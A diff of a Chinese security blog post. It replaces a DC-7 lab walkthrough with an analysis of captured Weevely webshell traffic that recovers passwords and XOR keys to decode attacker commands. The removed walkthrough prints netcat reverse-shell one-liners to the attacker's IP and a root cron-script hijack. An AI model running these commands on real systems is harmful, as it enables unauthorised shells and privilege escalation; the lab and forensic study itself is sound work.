@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="keywords" content="android">
+    <meta name="keywords" content="自动化,运维">
     
     <meta name="author" content="lee">
     
@@ -123,7 +123,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="https://leei.site/2026/02/05/dc7打靶报告/"/>
+    <link rel="canonical" href="https://leei.site/2026/09/04/科来流量分析+结合mcp自动化/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -133,15 +133,15 @@
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="dc7打靶报告">
-<meta property="og:url" content="https://leei.site/2026/02/05/dc7%E6%89%93%E9%9D%B6%E6%8A%A5%E5%91%8A/index.html">
+<meta property="og:title" content="科来流量分析&#x2F;结合MCP自动化-CSDN博客">
+<meta property="og:url" content="https://leei.site/2026/09/04/%E7%A7%91%E6%9D%A5%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90+%E7%BB%93%E5%90%88MCP%E8%87%AA%E5%8A%A8%E5%8C%96/index.html">
 <meta property="og:site_name" content="Lee&#39;s SecLab">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://leei.site/images/redefine-og.webp">
-<meta property="article:published_time" content="2026-02-04T19:02:10.767Z">
-<meta property="article:modified_time" content="2026-02-05T03:04:46.452Z">
-<meta property="article:author" content="Le_ee 博客等级 码龄1年">
+<meta property="article:published_time" content="2026-09-03T18:03:14.000Z">
+<meta property="article:modified_time" content="2026-09-04T02:11:44.763Z">
+<meta property="article:author" content="Le_ee">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://leei.site/images/redefine-og.webp">
     
@@ -155,7 +155,7 @@
     
     <title>
         
-            dc7打靶报告 | lee&#39;s seclab
+            科来流量分析/结合MCP自动化-CSDN博客 | lee&#39;s seclab
         
     </title>
 
@@ -608,7 +608,7 @@
 		<div class="article-title relative w-full">
 			
 			<div class="w-full flex items-center pt-6 justify-start">
-				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">dc7打靶报告</h1>
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">科来流量分析/结合MCP自动化-CSDN博客</h1>
 			</div>
 			
 		</div>
@@ -620,7 +620,7 @@
 			</div>
 			<div class="info flex flex-col justify-between">
 				<div class="author flex items-center">
-					<span class="name text-default-text-color text-lg font-semibold">Le_ee 博客等级 码龄1年</span>
+					<span class="name text-default-text-color text-lg font-semibold">Le_ee</span>
 					
 					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
 					
@@ -629,15 +629,15 @@
 					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
-        <span class="desktop">2026-02-05 03:02:10</span>
-        <span class="mobile">2026-02-05 03:02:10</span>
+        <span class="desktop">2026-09-04 02:03:14</span>
+        <span class="mobile">2026-09-04 02:03:14</span>
         <span class="hover-info">Created</span>
     </span>
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2026-02-05 11:04:46</span>
-            <span class="mobile">2026-02-05 11:04:46</span>
+            <span class="desktop">2026-09-04 10:11:44</span>
+            <span class="mobile">2026-09-04 10:11:44</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -665,246 +665,225 @@
 
 		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
 			<meta name="referrer" content="no-referrer"/>
-环境：
+主要分析两份 Weevely 通信流量，并尝试把科来网络分析系统与 Codex 连接起来，实现抓包文件的自动解析和报告生成。
 
-<p><strong>攻击机ip</strong>：Kali192.168.145.128</p>
-<p><strong>靶机ip</strong>：192.168.145.189</p>
-<p>信息收集</p>
-<p><code>arp-scan -l</code>，发现存活靶机 192.168.145.189</p>
-<p><img  
+<p>使用的抓包文件为：</p>
+<ul>
+<li><code>weevely3_4.pcapng</code></li>
+<li><code>weevely3_4_C.pcapng</code></li>
+</ul>
+<p>从当前抓包可以确认 <code>/hackable/uploads/wShell.php</code> 已经存在并被调用，但没有直接捕获其上传过程。</p>
+<p>上传者的IP172.16.1.76——攻击端</p>
+<p>被上传者的IP172.16.1.163——被攻击的服务器<img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/6e7cc805d8e14474995cdd441faaac71.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/da3d23db27b04c85a719cfa2e81a5072.png"
                      
                 ></p>
-<p>识别开放端口和操作系统</p>
-<p><code>nmap -A -p-&amp;#xA0;192.168.145.189</code></p>
-<p>开放端口：22(SSH)、80(HTTP)——cms是drupal 8，服务器是Apache</p>
-<p>操作系统：Linux</p>
-<p><img  
+<p>webshell文件上传后存储在这里<img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/029e0e194bc64afab1210ffba61a309c.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/e031662346e84d01a04cf2a2b136e461.png"
                      
                 ></p>
-<p>看一下web页面，提示这一关爆破和字典攻击都不一定有用</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/ccb9b7a2f2484130888b617d7b63eaee.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/e15a3e0819154286ad27f2f7130dc531.png"
-                     
-                ></p>
-<p><code>dirsearch -u http://192.168.145.189 -i 200&amp;#xFF0C;&amp;#x6307;&amp;#x5B9A;&amp;#x72B6;&amp;#x6001;&amp;#x7801;200&amp;#x626B;&amp;#x5B50;url</code></p>
-<p><code>&amp;#x9010;&amp;#x4E2A;&amp;#x5C1D;&amp;#x8BD5;&amp;#x4E00;&amp;#x4E0B;&amp;#xFF0C;&amp;#x53D1;&amp;#x73B0;&amp;#x4EE5;&amp;#x4E0B;&amp;#x51E0;&amp;#x4E2A;&amp;#x9875;&amp;#x9762;&amp;#x6709;&amp;#x6709;&amp;#x7528;&amp;#x56DE;&amp;#x663E;</code></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/74f6112e69da4ceba55169e743cc6e8d.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/a4ed271f91c04cc58d795c91218b20c6.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/9a196e7b875d4f9c8d84d1ef1b1a8414.png"
-                     
-                ></p>
-<p>看到左下角有一个疑似靶场作者留下的标识</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/8a0507b85e9741eeb5087c82c82bab2e.png"
-                     
-                ></p>
-<p>搜一下</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/6f717d0ddf5741fbaf80f426f454afa9.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/2992c25960ca4d53b93f53d70016e303.png"
-                     
-                ></p>
-<p>看看存储库里的每个文件，方向对了</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/44c2cdda5e9a4b41a648a52aa6fcfcc8.png"
-                     
-                ></p>
-<p>找到一组用户名和密码</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/82dbb327e9844dbeaa5789382353b68e.png"
-                     
-                ></p>
-<p>因为之前开放了22端口，直接用这组密码远程连接试试</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/333be2eb32d546f3838d274b3645ace3.png"
-                     
-                ></p>
-<p>登录成功</p>
-<p>sudo -l试了下用不了</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/e535d7999e7f4c798951ee68451e9697.png"
-                     
-                ></p>
-<p>ls发现有一个mbox，一个backups</p>
-<p>backups里有两个加密文件</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/7eb191d69fad49a4b36229cdada51391.png"
-                     
-                ></p>
-<p>cat一下mbox发现几个root发的邮件，有一个定时任务</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/38b0a720d0634b97b67379d7bab509fe.png"
-                     
-                ></p>
-<p>大约是15分钟执行一次</p>
-<p>Cron任务执行的 <strong>脚本完整路径</strong>： <code>/opt/scripts/backups.sh</code></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/10c0c25bb069440eb8f61a54b2edcce0.png"
-                     
-                ></p>
-<p>目前为止，我们还有个网页没有登录进去</p>
-<p>Drupal网站备份数据库 <strong>最常用工具就是drush，</strong> <code>drush</code> 可以 <strong>直接重置Drupal用户密码</strong></p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drush user-password admin --password=&quot;newpass123&quot;</span><br></pre></td></tr></table></figure></div>
+<p>完整请求路径是：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/hackable/uploads/wShell.php</span><br></pre></td></tr></table></figure></div>
 
-<p>登录成功</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/d27bdc1d440e4b74a8bbe4bab95e7a18.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/ebfd9329a16749c4b90a0c6ab9a05da8.png"
-                     
-                ></p>
-<p>左下角有一个add content ，我们试试能不能写个马进去，发现文本格式没有php的</p>
-<p>在manage里找到了extend</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/f594acacdaae4f588fea78c9c59af87e.png"
-                     
-                ></p>
-<p>安装文本格式php的工具插件</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/14c2a57e26ed4fba98684d491be5a4ac.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/64a3a715af7b48729d8d07cb5bd6c732.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/13504944c03d4b51a6578b73c0305751.png"
-                     
-                ></p>
-<p>安装PHP Filter模块</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/f7f8727f95d649b5bca713e75e1db8be.png"
-                     
-                ></p>
-<p>再回去artical编辑那里，发现文本形式可以选择php了</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/ee9e8fea07fb42128e4f4bb001d1d290.png"
-                     
-                ></p>
-<p>写入一句话木马</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/bee49018ff0143198ee0c3a404ffa0a8.png"
-                     
-                ></p>
-<p>保存</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/2f27e0c3269643bfaeb0e8ec33e95d7e.png"
-                     
-                ></p>
-<p>蚁剑成功连接</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/90ae96530b45414283fa08f1a0398762.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/3d7eaa7f02aa43f5a3ec9ccde3896d15.png"
-                     
-                ></p>
-<p><strong>建立反弹shell</strong></p>
-<p><code>kali:nc -lvnp 1234</code></p>
-<p><code>&lt;strong&gt;&amp;#x865A;&amp;#x62DF;&amp;#x7EC8;&amp;#x7AEF;&amp;#xFF1A;&lt;/strong&gt;nc -e /bin/bash 192.168.145.128 1234</code></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/470e28979cd74d1c934fd5f5d5194d60.png"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/eb810b4142c641119cd735ecb2983192.png"
-                     
-                ></p>
-<p>然后我们将一段能建立 <strong>反向Shell</strong>的代码追加到 <code>/opt/scripts/backups.sh</code> 文件中，等cron以 <strong>root权限</strong>执行该脚本时，就能获得一个root shell</p>
-<p>echo “rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.145.128 5555 &gt;&#x2F;tmp&#x2F;f” &gt;&gt; &#x2F;opt&#x2F;scripts&#x2F;backups.sh</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;                    # &amp;#x5220;&amp;#x9664;&amp;#x65E7;&amp;#x7684;&amp;#x7BA1;&amp;#x9053;&amp;#x6587;&amp;#x4EF6;&amp;#xFF08;&amp;#x5982;&amp;#x679C;&amp;#x5B58;&amp;#x5728;&amp;#xFF09;</span><br><span class="line">mkfifo /tmp/f;                # &amp;#x521B;&amp;#x5EFA;&amp;#x547D;&amp;#x540D;&amp;#x7BA1;&amp;#x9053;&amp;#x6587;&amp;#x4EF6; /tmp/f</span><br><span class="line">cat /tmp/f |                  # &amp;#x8BFB;&amp;#x53D6;&amp;#x7BA1;&amp;#x9053;&amp;#x5185;&amp;#x5BB9;</span><br><span class="line">/bin/sh -i 2&gt;&amp;1 |             # &amp;#x542F;&amp;#x52A8;&amp;#x4EA4;&amp;#x4E92;&amp;#x5F0F;shell&amp;#xFF0C;&amp;#x5E76;&amp;#x5C06;&amp;#x9519;&amp;#x8BEF;&amp;#x8F93;&amp;#x51FA;&amp;#x91CD;&amp;#x5B9A;&amp;#x5411;&amp;#x5230;&amp;#x6807;&amp;#x51C6;&amp;#x8F93;&amp;#x51FA;</span><br><span class="line">nc 192.168.145.128 5555 &gt; /tmp/f  # &amp;#x8FDE;&amp;#x63A5;&amp;#x5230;&amp;#x653B;&amp;#x51FB;&amp;#x8005;&amp;#x673A;&amp;#x5668;(192.168.145.128:5555)&amp;#xFF0C;&amp;#x5E76;&amp;#x5C06;&amp;#x63A5;&amp;#x6536;&amp;#x5230;&amp;#x7684;&amp;#x6570;&amp;#x636E;&amp;#x5199;&amp;#x5165;&amp;#x7BA1;&amp;#x9053;</span><br></pre></td></tr></table></figure></div>
+<p>Webshell上传后 攻击者又做什么？</p>
+<p>看一下第一个http请求对应的数据流，可以看到攻击者通过POST请求像webshell发送了payload——HTTP请求体</p>
+<p>这里需要注意：这条 POST 请求能够证明 WebShell 已经存在于服务器上，并且开始接收攻击命令，但不能单独证明 WebShell 的上传过程也包含在这段流量中。</p>
+<p>然后双击查看第一条http通信的数据流，可以看到攻击者通过 POST 请求向 WebShell 发送了一段 Payload。</p>
+<p>由于抓包文件名中带有 <code>weevely</code>，因此判断这可能是 Weevely 产生的加密通信。</p>
+<p>Weevely 不会直接发送明文命令，而是使用连接密码生成 MD5，并将 MD5 的不同部分作为异或密钥和通信标记。</p>
+<p>在请求体和响应体中，可以发现下面两个字符串反复出现</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0339f2efd328</span><br><span class="line">6b3c9e505489</span><br></pre></td></tr></table></figure></div>
 
-<p>等待root执行定时任务</p>
-<p><strong>kali监听</strong>： <code>nc -lvnp 5555</code></p>
-<p><img  
+<p>对密码字典进行计算后，发现：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5(bmk) = 890ce1120339f2efd3286b3c9e505489</span><br></pre></td></tr></table></figure></div>
+
+<p>刚好可以对应抓包中的两个固定标记，因此可以确定连接密码为：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bmk</span><br></pre></td></tr></table></figure></div>
+
+<p>其中，MD5 的前8位：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">890ce112</span><br></pre></td></tr></table></figure></div>
+
+<p>就是解密通信内容使用的异或密钥。</p>
+<p>完整的对应关系为：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x5F02;&amp;#x6216;&amp;#x5BC6;&amp;#x94A5;&amp;#xFF1A;890ce112</span><br><span class="line">&amp;#x5F00;&amp;#x59CB;&amp;#x6807;&amp;#x8BB0;&amp;#xFF1A;0339f2efd328</span><br><span class="line">&amp;#x7ED3;&amp;#x675F;&amp;#x6807;&amp;#x8BB0;&amp;#xFF1A;6b3c9e505489</span><br></pre></td></tr></table></figure></div>
+
+<p>Weevely 流量的基本还原过程为：</p>
+<p>解密第一轮通信后得到：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    echo(24331);</span><br><span class="line">&#125; catch(Exception $e) &#123;</span><br><span class="line">    // &amp;#x8FD4;&amp;#x56DE;&amp;#x6267;&amp;#x884C;&amp;#x9519;&amp;#x8BEF;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>其中真正执行的操作是：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo(24331);</span><br></pre></td></tr></table></figure></div>
+
+<p>外面的 <code>try...catch</code> 主要用于捕获错误，并把错误信息返回给 Weevely 客户端。</p>
+<p>后续还原出的命令依次为：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo 40902</span><br><span class="line">whoami</span><br><span class="line">ls</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure></div>
+
+<p>对应结果如下：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">echo 40902&amp;#xFF1A;&amp;#x8FD4;&amp;#x56DE; 40902&amp;#xFF0C;&amp;#x7528;&amp;#x4E8E;&amp;#x6D4B;&amp;#x8BD5;&amp;#x547D;&amp;#x4EE4;&amp;#x6267;&amp;#x884C;&amp;#x662F;&amp;#x5426;&amp;#x6B63;&amp;#x5E38;&amp;#x3002;</span><br><span class="line"></span><br><span class="line">whoami&amp;#xFF1A;&amp;#x8FD4;&amp;#x56DE; nginx&amp;#xFF0C;&amp;#x8BF4;&amp;#x660E; Web &amp;#x670D;&amp;#x52A1;&amp;#x4EE5; nginx &amp;#x7528;&amp;#x6237;&amp;#x8EAB;&amp;#x4EFD;&amp;#x8FD0;&amp;#x884C;&amp;#x3002;</span><br><span class="line"></span><br><span class="line">ls&amp;#xFF1A;&amp;#x67E5;&amp;#x770B;&amp;#x5F53;&amp;#x524D;&amp;#x76EE;&amp;#x5F55;&amp;#x4E2D;&amp;#x7684;&amp;#x6587;&amp;#x4EF6;&amp;#x3002;</span><br><span class="line"></span><br><span class="line">pwd&amp;#xFF1A;&amp;#x8FD4;&amp;#x56DE; /usr/share/nginx/html/hackable/uploads&amp;#xFF0C;</span><br><span class="line">&amp;#x8BF4;&amp;#x660E; WebShell &amp;#x5F53;&amp;#x524D;&amp;#x4F4D;&amp;#x4E8E;&amp;#x8BE5;&amp;#x76EE;&amp;#x5F55;&amp;#x3002;</span><br></pre></td></tr></table></figure></div>
+
+<p>还是看http日志，发现攻击者已经上传了webshell——wShell3.php，HTTP 日志中发现向 <code>/vulnerabilities/upload/</code> 发起的 multipart&#x2F;form-data POST 请求，上传文件名为 <code>wShell3.php</code>，服务器响应显示上传成功。</p>
+<p>点进去看源ip和目的ip，跟上一个一样<img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="https://i-blog.csdnimg.cn/direct/6339c475b3f645db9ea6acde7411476e.png"
+                     data-src="https://i-blog.csdnimg.cn/direct/bbce648ce5384016a437848d86cdff93.png"
                      
                 ></p>
-<p>完结撒花！！</p>
+<p>按照前面同样的方法分析，这一次的固定标记是：<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/358c280ae80d4889b7d4e84d40735359.png"
+                     
+                ><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://i-blog.csdnimg.cn/direct/5ee3a42bb64c464f90e8baf1eaabd117.png"
+                     
+                ></p>
+<p>按照案例一相同的方法，观察 HTTP 请求体和响应体，可以找到这一组固定标记：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x5F00;&amp;#x59CB;&amp;#x6807;&amp;#x8BB0;&amp;#xFF1A;b5c349531268</span><br><span class="line">&amp;#x7ED3;&amp;#x675F;&amp;#x6807;&amp;#x8BB0;&amp;#xFF1A;ae8484112a78</span><br></pre></td></tr></table></figure></div>
+
+<p>通过字典计算，发现密码 <code>lyb</code> 的 MD5 为：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5(lyb) = 38d17dd2b5c349531268ae8484112a78</span><br></pre></td></tr></table></figure></div>
+
+<p>它正好包含抓包中的两个固定标记，因此可以确定本次 Weevely 连接使用的密码为：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lyb</span><br></pre></td></tr></table></figure></div>
+
+<p>本次通信使用的异或密钥为 MD5 的前8位：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">38d17dd2</span><br></pre></td></tr></table></figure></div>
+
+<p>完整对应关系为：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x5F02;&amp;#x6216;&amp;#x5BC6;&amp;#x94A5;&amp;#xFF1A;38d17dd2</span><br><span class="line">&amp;#x5F00;&amp;#x59CB;&amp;#x6807;&amp;#x8BB0;&amp;#xFF1A;b5c349531268</span><br><span class="line">&amp;#x7ED3;&amp;#x675F;&amp;#x6807;&amp;#x8BB0;&amp;#xFF1A;ae8484112a78</span><br></pre></td></tr></table></figure></div>
+
+<p>对每一轮通信进行解密后，得到以下操作：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 89386</span><br></pre></td></tr></table></figure></div>
+
+<p>返回 <code>89386</code>，用于测试 WebShell 能否正常执行和返回结果。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 38658</span><br></pre></td></tr></table></figure></div>
+
+<p>返回 <code>38658</code>，再次测试系统命令执行功能。</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gethostname()</span><br></pre></td></tr></table></figure></div>
+
+<p>获取服务器主机名，结果为：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost.localdomain</span><br></pre></td></tr></table></figure></div>
+
+<p>随后 Weevely 获取当前运行用户，结果为：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcwd()</span><br></pre></td></tr></table></figure></div>
+
+<p>获取当前工作目录，结果为：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/nginx/html/hackable/uploads</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure></div>
+
+<p>再次确认当前用户，返回：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx</span><br></pre></td></tr></table></figure></div>
+
+<p>查看当前目录中的文件，返回结果中包括：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Decrypt.php</span><br><span class="line">antShell.php</span><br><span class="line">cShell.php</span><br><span class="line">dvwa_email.png</span><br><span class="line">shell.php</span><br><span class="line">shell3.php</span><br><span class="line">wShell.phar</span><br><span class="line">wShell.php</span><br><span class="line">wShell3.php</span><br><span class="line">weevelyDeCrypt.php</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure></div>
+
+<p>确认当前目录为：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/nginx/html/hackable/uploads</span><br></pre></td></tr></table></figure></div>
+
+<p>之后，攻击者又尝试执行：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ip a</span><br><span class="line">ip</span><br><span class="line">ipconfig</span><br><span class="line">ifconfig</span><br></pre></td></tr></table></figure></div>
+
+<p>这些命令都用于查看服务器的网络配置，但响应中均提示命令不存在。</p>
+<p>最后执行：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat</span><br></pre></td></tr></table></figure></div>
+
+<p>攻击者可能想查看服务器当前的网络连接，不过抓包中没有捕获到对应的响应结果，因此无法确定该命令最终是否执行成功。</p>
+<p>综合当前抓包能够还原的内容，攻击者获取了服务器主机名、运行用户、当前目录和目录文件。除此之外，暂未发现其获取更多敏感信息的证据。</p>
